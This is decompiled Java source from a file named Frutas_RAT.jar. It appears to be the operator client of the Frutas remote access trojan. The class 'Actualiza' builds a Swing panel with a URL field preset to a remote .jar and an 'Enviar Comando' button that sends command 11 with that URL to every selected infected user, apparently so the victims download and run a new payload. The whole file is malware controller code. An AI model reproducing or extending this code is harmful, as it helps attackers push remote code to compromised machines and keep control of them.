/*     */ package cliente;
/*     */ 
/*     */ import java.awt.Color;
/*     */ import java.awt.Container;
/*     */ import java.awt.Font;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ActionListener;
/*     */ import java.util.ResourceBundle;
/*     */ import javax.swing.GroupLayout;
/*     */ import javax.swing.GroupLayout.Alignment;
/*     */ import javax.swing.GroupLayout.ParallelGroup;
/*     */ import javax.swing.GroupLayout.SequentialGroup;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JInternalFrame;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JTextField;
/*     */ import javax.swing.LayoutStyle.ComponentPlacement;
/*     */ 
/*     */ public class Actualiza extends JInternalFrame
/*     */   implements SoporteLenguaje
/*     */ {
/*     */   private Usuario[] user;
/*     */   private String titulop;
/*     */   private JButton comandosend;
/*     */   private JLabel jLabel2;
/*     */   private JTextField url;
/*     */ 
/*     */   public Actualiza(Usuario[] us, ResourceBundle rb)
/*     */   {
/*  20 */     initComponents();
/*  21 */     this.user = us;
/*  22 */     if (this.user.length > 1) {
/*  23 */       setTitle(getTitle() + " Mensaje a " + us.length + " usuarios");
/*  24 */       this.titulop = (" Mensaje a " + us.length + " usuarios");
/*     */     } else {
/*  26 */       setTitle(getTitle() + this.user[0].getIdentificador());
/*  27 */       this.titulop = this.user[0].getIdentificador();
/*     */     }
/*  29 */     changeLenguage(rb);
/*     */   }
/*     */ 
/*     */   private void initComponents()
/*     */   {
/*  41 */     this.url = new JTextField();
/*  42 */     this.jLabel2 = new JLabel();
/*  43 */     this.comandosend = new JButton();
/*     */ 
/*  45 */     setBackground(new Color(255, 255, 153));
/*  46 */     setClosable(true);
/*  47 */     setIconifiable(true);
/*  48 */     setResizable(true);
/*  49 */     setTitle("Actualización del Server");
/*  50 */     setDoubleBuffered(true);
/*     */ 
/*  52 */     this.url.setBackground(new Color(255, 255, 153));
/*  53 */     this.url.setFont(new Font("Times New Roman", 1, 12));
/*  54 */     this.url.setForeground(new Color(255, 102, 0));
/*  55 */     this.url.setHorizontalAlignment(0);
/*  56 */     this.url.setText("http://www.google.com/a.jar");
/*     */ 
/*  58 */     this.jLabel2.setFont(new Font("Times New Roman", 1, 14));
/*  59 */     this.jLabel2.setForeground(new Color(0, 102, 51));
/*  60 */     this.jLabel2.setHorizontalAlignment(0);
/*  61 */     this.jLabel2.setText("URL");
/*     */ 
/*  63 */     this.comandosend.setFont(new Font("Times New Roman", 1, 12));
/*  64 */     this.comandosend.setText("Enviar Comando");
/*  65 */     this.comandosend.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/*  67 */         Actualiza.this.comandosendActionPerformed(evt);
/*     */       }
/*     */     });
/*  71 */     GroupLayout layout = new GroupLayout(getContentPane());
/*  72 */     getContentPane().setLayout(layout);
/*  73 */     layout.setHorizontalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.url, -1, 247, 32767).addComponent(this.jLabel2, -1, -1, 32767).addGroup(layout.createSequentialGroup().addGap(63, 63, 63).addComponent(this.comandosend).addGap(0, 0, 32767))).addContainerGap()));
/*     */ 
/*  86 */     layout.setVerticalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addComponent(this.jLabel2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.url, -2, -1, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.comandosend).addContainerGap(-1, 32767)));
/*     */ 
/*  98 */     pack();
/*     */   }
/*     */ 
/*     */   private void comandosendActionPerformed(ActionEvent evt) {
/* 102 */     String tst = this.url.getText();
/*     */ 
/* 104 */     for (int i = 0; i < this.user.length; i++) {
/* 105 */       this.user[i].sendComando(11, tst);
/*     */     }
/*     */ 
/* 108 */     dispose();
/*     */   }
/*     */ 
/*     */   public void changeLenguage(ResourceBundle rb)
/*     */   {
/*     */   }
/*     */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     cliente.Actualiza
 * JD-Core Version:    0.6.2
 */